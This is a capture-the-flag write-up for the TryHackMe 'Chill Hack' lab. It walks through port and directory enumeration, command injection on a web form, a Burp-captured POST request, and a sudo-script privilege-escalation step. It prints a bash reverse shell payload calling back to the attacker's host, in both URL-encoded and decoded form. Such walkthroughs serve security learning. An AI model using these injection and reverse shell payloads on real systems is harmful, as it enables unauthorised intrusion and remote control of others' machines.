# Chill Hack

![image](https://user-images.githubusercontent.com/5285547/127403967-7b72f2d6-60aa-4f74-8f0d-f8bbce81071c.png)

Room link: https://tryhackme.com/room/chillhack


A quick enum to get started, I usually run as a basic, nmap, nikto, gobuster as a min.

## Nmap 

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

## Gobuster

```
/css                  (Status: 301) [Size: 310] [--> http://10.10.44.162/css/]
/images               (Status: 301) [Size: 313] [--> http://10.10.44.162/images/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.44.162/fonts/] 
/secret               (Status: 301) [Size: 313] [--> http://10.10.44.162/secret/]             #  Seem's intresting! 
/js                   (Status: 301) [Size: 309] [--> http://10.10.44.162/js/] 
```

## http://10.10.44.162/secret/
*replace your IP for the rooms IP

This page gives us a box with command execution (Easy!)  

![image](https://user-images.githubusercontent.com/5285547/127404324-dcb6a694-b7cc-4037-8b6c-7f8b56acf541.png)

Trying other things like "ls" gives you...  

![image](https://user-images.githubusercontent.com/5285547/127404273-9aaf970c-0d55-48db-8908-1f152db4b0e9.png)


Testing some more I quickly realise we can chain together commands using ";"
ie:
```
id;ls
```

![image](https://user-images.githubusercontent.com/5285547/127404437-9126f1a0-0442-47a4-8a65-5b2038ddea97.png)

I captured the request in burp suite and then tried a few payloads to get a revershell back. 
First I checked with a simple ping command for a result to prove the connection back. 

Kali
```
sudo tcpdump -i tun0 icmp 
```

Post request

```
POST /secret/ HTTP/1.1
Host: 10.10.44.162
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://10.10.44.162
Connection: close
Referer: http://10.10.44.162/secret/
Upgrade-Insecure-Requests: 1

command=id%3bping%20-c%201%2010.8.153.120
```

Bingo! A reply!
```
┌──(ac1d㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp                          
[sudo] password for ac1d: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:35:26.127709 IP 10.10.44.162 > 10.8.153.120: ICMP echo request, id 1871, seq 1, length 64
23:35:26.127742 IP 10.8.153.120 > 10.10.44.162: ICMP echo reply, id 1871, seq 1, length 64
```

Now I test payloads to see what pings back. 

Reverse shell

Sending a bash rev shell we can get a reverse shell from the command injection we just found. 

```
command=id%3bbash%20-c%20%22%2fbin%2fbash%20-i%20%3e%26%20%2fdev%2ftcp%2f10.8.153.120%2f9999%200%3e%261%
```
Decoded
```
command=id;bash -c "/bin/bash -i >& /dev/tcp/10.8.153.120/9999 0>&1"
```

![image](https://user-images.githubusercontent.com/5285547/127405379-d0199737-5cdb-4af3-a69b-57769ef1529f.png)


## User

Checking sudo -l as www-data shows us something intresting. 

```
Matching Defaults entries for www-data on ubuntu:                                                                                                                                     env_reset, mail_badpass,                                                                                                                                                         secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                                                                                                 
User www-data may run the following commands on ubuntu:                                                                                                                               (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh                                                                                                                             


www-data@ubuntu:/tmp$  cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

The script seems to read a name and add it to the person variable.  
Then ask for a msg but never use it. 2>/dev/null
2=STDERR, so send all errors to nothing (but still executing). 

I send another ping to myself to prove its working. 

![image](https://user-images.githubusercontent.com/5285547/127407467-11686b54-374c-4094-941b-282f44528d54.png)

Then I try simply /bin/bash for a shell as the user. 




